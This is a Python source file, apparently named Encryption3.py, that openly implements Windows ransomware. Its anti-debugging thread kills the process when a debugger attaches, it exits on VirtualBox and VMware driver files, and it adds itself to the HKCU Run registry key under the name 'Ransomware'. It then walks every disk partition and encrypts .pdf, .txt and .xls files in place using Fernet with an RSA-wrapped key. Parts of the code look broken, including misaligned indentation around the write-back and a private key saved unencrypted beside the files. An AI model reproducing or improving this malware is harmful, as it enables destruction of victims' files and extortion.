import os
import ctypes
import threading
from time import sleep
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization,hashes
from cryptography.fernet import Fernet
import sys
import winreg as reg
import psutil



# Check if debugger is present
def anti_debug():
    while True:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.GetCurrentProcess(), -1)
        sleep(0.1)

def anti_sandbox():
    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vm3dmp.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmxnet.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\vboxvideo.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxDrv.sys") or \
            os.path.exists("C:\\WINDOWS\\system32\\drivers\\VMToolsHook.dll"):
        print("Virtual machine or sandbox detected")
        sys.exit()

    # check the number of processors and cores
    if os.cpu_count() == 1 or (os.cpu_count() % 2) != 0:
        print("Invalid number of processors or cores")
        sys.exit()
def add_to_startup(file_path):
    """
    Add the file to Windows startup registry key
    """
    try:

        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as reg_key:
            reg.SetValueEx(reg_key, "Ransomware", 0, reg.REG_SZ, file_path)
    except PermissionError:
        pass
def encrypt_directory():

    partitions = psutil.disk_partitions()

    # generate RSA key pair
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # serialize public key to send to victim
    public_key_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # create Fernet cipher with a randomly generated key
    key = Fernet.generate_key()
    cipher = Fernet(key)

    # specify the directory to encrypt

    # loop through each file in the directory
    for partition in partitions:
        partition_path = partition.mountpoint
        for dirpath, dirnames, filenames in os.walk(partition_path):
            # loop through each file in the directory
            for filename in filenames:
                # create the full file path
                filepath = os.path.join(dirpath, filename)
                try:
                    if os.path.isfile(filepath):
                        if filepath.endswith('.pdf') or filepath.endswith('.txt') or filepath.endswith('.xls'):
                            # read the plaintext from the file
                            with open(filepath, 'rb') as f:
                                plaintext = f.read()
                        # encrypt the plaintext using the Fernet algorithm
                                encrypted = cipher.encrypt(plaintext)
                    # write the encrypted data back to the same file
                            with open(filepath, 'wb') as f:
                                f.write(encrypted)
                except PermissionError:
                    pass

    # encrypt the key using the victim's public key
    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # save encrypted key and public key to files
    with open('encrypted_key', 'wb') as f:
        f.write(encrypted_key)
    with open('public_key.pem', 'wb') as f:
        f.write(public_key_bytes)

    # serialize private key to file
    private_key_bytes = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    with open('private_key.pem', 'wb') as f:
        f.write(private_key_bytes)


if __name__ == '__main__':
    # create a new thread to check for a debugger
    debug_thread = threading.Thread(target=anti_debug)
    debug_thread.daemon = True
    debug_thread.start()
    current_dir = os.getcwd()
    ransomware_path = os.path.join(current_dir, "Encryption3.py")
    add_to_startup(ransomware_path)

    # run the encryption function
    encrypt_directory()
